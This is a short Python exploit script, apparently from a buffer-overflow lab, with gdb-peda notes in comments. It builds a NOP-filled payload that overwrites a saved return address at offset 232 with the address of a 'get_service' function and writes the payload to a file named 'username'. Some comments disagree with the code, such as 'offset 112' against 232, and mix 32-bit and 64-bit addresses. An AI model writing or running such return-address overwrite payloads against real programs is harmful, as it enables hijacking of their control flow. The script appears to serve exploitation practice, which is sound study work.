# gdb-peda$ p $ebp
# $1 = 0xffffd470
# gdb-peda$ p &username 
# $2 = (char (*)[210]) 0x7fffffffd390
# 224
# name 0x7fffffffe1d0
# pw 0x7fffffffdf20
# get_service 0x5555555551e9
import sys 
  
 
# Fill the content with NOPs 
filesize = 679
content = bytearray(0x90 for i in range(filesize)) 
# Put the shellcode at the end 
# start = filesize - len(shellcode) 
# content[start:start+len(shellcode)] = shellcode 
 
# Put the address at offset 112 
ret = 0x5555555551e9 
offset = 232
content[offset:offset+8] = (ret).to_bytes(8,byteorder='little') 
 
# Write the content to a file 
with open('username', 'wb') as f: 
    f.write(content) 

